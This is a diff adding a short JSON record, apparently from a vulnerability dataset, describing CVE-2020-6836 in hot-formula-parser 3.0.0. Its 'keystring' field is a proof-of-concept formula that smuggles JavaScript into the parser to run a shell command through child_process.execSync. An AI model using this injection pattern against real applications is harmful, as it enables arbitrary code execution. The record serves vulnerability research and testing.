@@ -1,0 +1,8 @@
+{
+    "id": "CVE-2020-6836",
+    "upstream": "hot-formula-parser@3.0.0",
+    "keymethod": "parse",
+    "keystring": "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])",
+    "location": "lib/grammar-parser/grammar-parser.js:258:31",
+    "downstreams": []
+}
